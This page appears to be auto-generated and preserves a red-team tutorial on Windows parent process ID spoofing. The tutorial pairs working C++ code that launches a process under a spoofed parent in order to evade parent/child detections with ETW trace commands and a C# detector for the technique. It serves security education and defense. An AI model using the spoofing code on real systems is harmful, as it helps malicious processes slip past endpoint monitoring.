---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Parent Process ID (PPID) Spoofing

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-parent-process-id-ppid-spoofing` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/parent-process-id-ppid-spoofing.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Parent Process ID (PPID) Spoofing](../../topics/offensive-security/parent-process-id-ppid-spoofing.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-parent-process-id-ppid-spoofing |
| name | Parent Process ID (PPID) Spoofing |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/parent-process-id-ppid-spoofing.md |

## Preserved Source Material

````yaml
_asset_filenames:
- explorer-spawns-notepad.gif
- image (562).png
- image (564).png
- image (565).png
- image (567).png
- image (568).png
- ppid-spoofing-detection-etw.gif
- ppid-spoofing-notepad.gif
_body: "# Parent Process ID (PPID) Spoofing\n\n## PPID Spoofing\n\nPPID spoofing is a technique that allows attackers to start\
  \ programs with arbitrary parent process set. This helps attackers make it look as if their programs were spawned by another\
  \ process (instead of the one that would have spawned it if no spoofing was done) and it may help evade detections, that\
  \ are based on parent/child process relationships.&#x20;\n\nFor example, by default, most programs that an interactive user\
  \ launches, will be spawned by explorer.exe:\n\n![](../../.gitbook/assets/explorer-spawns-notepad.gif)\n\nHowever, with\
  \ the below code, we can make it look as if the notepad.exe was spawned by igfxTray.exe (PID 6200):\n\n{% code title=\"\
  ppid-spoofing.cpp\" %}\n```cpp\n#include <windows.h>\n#include <TlHelp32.h>\n#include <iostream>\n\nint main() \n{\n\tSTARTUPINFOEXA\
  \ si;\n\tPROCESS_INFORMATION pi;\n\tSIZE_T attributeSize;\n\tZeroMemory(&si, sizeof(STARTUPINFOEXA));\n\t\n\tHANDLE parentProcessHandle\
  \ = OpenProcess(MAXIMUM_ALLOWED, false, 6200);\n\n\tInitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);\n\tsi.lpAttributeList\
  \ = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);\n\tInitializeProcThreadAttributeList(si.lpAttributeList,\
  \ 1, 0, &attributeSize);\n\tUpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle,\
  \ sizeof(HANDLE), NULL, NULL);\n\tsi.StartupInfo.cb = sizeof(STARTUPINFOEXA);\n\n\tCreateProcessA(NULL, (LPSTR)\"notepad\"\
  , NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);\n\n\treturn 0;\n}\n```\n{% endcode\
  \ %}\n\nIf we compile and run the above code, we will see the notepad pop under the spoofed parent - igfxTray.exe (PID 6200):\n\
  \n![](../../.gitbook/assets/ppid-spoofing-notepad.gif)\n\n## PPID Spoofing Detection\n\nFor PPID spoofing detection, we\
  \ can use [Event Tracing for Windows](../../miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101.md),\
  \ and more specifically, the `Microsoft-Windows-Kernel-Process` provider.\n\nThis provider emits information about started\
  \ and killed processes on the system, amongst many other things.&#x20;\n\nWe can quickly check out some logs it generates\
  \ by creating a trace session and subscribing to process related events (0x10 keyword):\n\n```\nlogman create trace ppid-spoofing\
  \ -p Microsoft-Windows-Kernel-Process 0x10 -ets\nlogman start ppid-spoofing\n```\n\nLet's confirm the trace session is running:\n\
  \n```\nlogman query ppid-spoofing -ets\n```\n\n![](<../../.gitbook/assets/image (564).png>)\n\nNow, let's execute our notepad.exe\
  \ with a spoofed parent again and let's look at where the log files from our ETW tracing session are saved to:\n\n![](<../../.gitbook/assets/image\
  \ (562).png>)\n\nOpen the C:\\ppid-spoofing.etl in Windows Event Viewer:\n\n![](<../../.gitbook/assets/image (565).png>)\n\
  \nWe can find an event with ID 1, saying that notepad was started by a process with PID 6200 (that's our spoofed PPID of\
  \ the process igfxTray.exe):\n\n![](<../../.gitbook/assets/image (567).png>)\n\nIf we look at the same data in an XML view\
  \ (the details tab) and cross check it with our processes tree in Process Explorer, we see:\n\n* in blue - the notepad we\
  \ started with a spoofed process PID\n* in red - notepad's spoofed parent process and its PID\n* in black - our malicious\
  \ program that started notepad with a spoofed  PPID!\n\n![](<../../.gitbook/assets/image (568).png>)\n\nFrom the above,\
  \ we can conclude that when `ParentProcessId` (red, PID 6200) != `Execution Process ID` (black, PID 11076), we may be looking\
  \ at a PPID spoofing.\n\nNow that confirmed we have the required telemetry for detection, we can write a simple C# consumer\
  \ to do real time PPID spoofing detection:\n\n{% code title=\"ppid-spoofing-detection.cs\" %}\n```csharp\n# based on https://github.com/zodiacon/DotNextSP2019/blob/master/SimpleConsumer/Program.cs\n\
  using Microsoft.Diagnostics.Tracing.Parsers;\nusing Microsoft.Diagnostics.Tracing.Session;\nusing System;\nusing System.Collections.Generic;\n\
  using System.Diagnostics;\nusing System.Linq;\nusing System.Linq.Expressions;\nusing System.Text;\nusing System.Text.RegularExpressions;\n\
  using System.Threading.Tasks;\n\nnamespace PPIDSpoofingDetection\n{\n    static class Program\n    {\n        static void\
  \ Main(string[] args)\n        {\n            using (var session = new TraceEventSession(\"spotless-ppid-spoofing\"))\n\
  \            {\n                Console.CancelKeyPress += delegate {\n                    session.Source.StopProcessing();\n\
  \                    session.Dispose();\n                };\n\n                session.EnableProvider(\"Microsoft-Windows-Kernel-Process\"\
  , Microsoft.Diagnostics.Tracing.TraceEventLevel.Always, 0x10);\n                var parser = session.Source.Dynamic;\n \
  \               parser.All += e => {\n                    if (e.OpcodeName == \"Start\" && Regex.IsMatch(e.FormattedMessage.ToLower(),\
  \ \"werfault\") == false)\n                    {\n                        string[] messageBits = e.FormattedMessage.Replace(\"\
  ,\", string.Empty).Split(' ');\n                        int PID = int.Parse(messageBits[1]);\n                        int\
  \ PPID = int.Parse(messageBits[10]);\n                        int realPPID = e.ProcessID;\n                        \n  \
  \                      // if ParentProcessId (red, PID 6200) != Execution Process ID (black, PID 11076)\n              \
  \          if (PPID != realPPID)\n                        {\n                            // this may fail if the process\
  \ is already gone.\n                            string processName = Process.GetProcessById(PID).ProcessName;\n        \
  \                    Console.WriteLine($\"{e.TimeStamp} PPID Spoofing detected: {processName} (PID={PID}) started by PPID={realPPID}\
  \ rather than PPID={PPID}\");\n                        }\n                    }\n                };\n                session.Source.Process();\n\
  \            }\n        }\n    }\n}\n```\n{% endcode %}\n\nIf we compile and run the code, and then attempt to launch notepad\
  \ with a spoofed PPID again, it will get flagged:\n\n![](../../.gitbook/assets/ppid-spoofing-detection-etw.gif)\n\n## References\n\
  \n{% embed url=\"https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/\"\
  \ %}\n\n{% embed url=\"https://attack.mitre.org/techniques/T1502/\" %}\n\n{% embed url=\"https://blog.f-secure.com/detecting-parent-pid-spoofing/\"\
  \ %}"
_relative_path: offensive-security/defense-evasion/parent-process-id-ppid-spoofing.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/parent-process-id-ppid-spoofing.md
````
